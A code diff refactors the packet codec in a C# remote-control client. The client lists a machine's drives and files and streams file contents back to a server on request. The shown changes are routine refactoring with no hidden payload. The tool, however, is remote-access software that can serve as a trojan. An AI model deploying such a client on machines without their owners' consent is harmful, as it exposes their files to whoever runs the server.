@@ -19,6 +19,7 @@ using System.Net;
 using RemoteControl.Protocals.Response;
 using Microsoft.Win32;
 using System.Runtime.InteropServices;
+using RemoteControl.Protocals.Codec;
 
 namespace RemoteControl.Client
 {
@@ -110,7 +111,7 @@ namespace RemoteControl.Client
             if (isTestMode)
             {
                 clientParameters.SetServerIP("192.168.1.136");
-                clientParameters.ServerPort = 10086;
+                clientParameters.ServerPort = 10010;
                 clientParameters.OnlineAvatar = "";
                 clientParameters.ServiceName = "";
             }
@@ -200,7 +201,7 @@ namespace RemoteControl.Client
         {
             ePacketType packetType;
             object obj;
-            PacketFactory.DecodeObject(packet, out packetType, out obj);
+            CodecFactory.Instance.DecodeObject(packet, out packetType, out obj);
             Console.WriteLine(packetType.ToString());
 
             string sessionId = session.SocketId;
@@ -208,7 +209,7 @@ namespace RemoteControl.Client
             {
                 ResponseGetDrives resp = new ResponseGetDrives();
                 resp.drives = Environment.GetLogicalDrives().ToList();
-                oServer.Send(PacketFactory.EncodeOject(ePacketType.PACKET_GET_DRIVES_RESPONSE, resp));
+                session.Send(ePacketType.PACKET_GET_DRIVES_RESPONSE, resp);
             }
             else if (packetType == ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST)
             {
@@ -244,7 +245,7 @@ namespace RemoteControl.Client
                             LastAccessTime = fi.LastAccessTime
                         });
                     }
-                    oServer.Send(PacketFactory.EncodeOject(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_RESPONSE, resp));
+                    session.Send(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_RESPONSE, resp);
                 }
                 catch (Exception ex)
                 {
@@ -970,12 +971,13 @@ namespace RemoteControl.Client
                 if (size < 1)
                     break;
 
-                byte[] data = new byte[size];
-                for (int i = 0; i < data.Length; i++)
+                ResponseStartDownload resp = new ResponseStartDownload();
+                resp.Data = new byte[size];
+                for (int i = 0; i < size; i++)
                 {
-                    data[i] = buffer[i];
+                    resp.Data[i] = buffer[i];
                 }
-                session.Send(ePacketType.PACKET_START_DOWNLOAD_RESPONSE, data);
+                session.Send(ePacketType.PACKET_START_DOWNLOAD_RESPONSE, resp);
             }
             fs.Close();
             if (sessionDownloadHandleSwitch.ContainsKey(session.SocketId))
@@ -1074,7 +1076,7 @@ namespace RemoteControl.Client
                 {
                     if (oServer != null)
                     {
-                        byte[] packet = PacketFactory.EncodeOject(ePacketType.PACKET_HEART_BEAR, null);
+                        byte[] packet = CodecFactory.Instance.EncodeOject(ePacketType.PACKET_HEART_BEAR, null);
                         oServer.Send(packet);
                     }
                 }
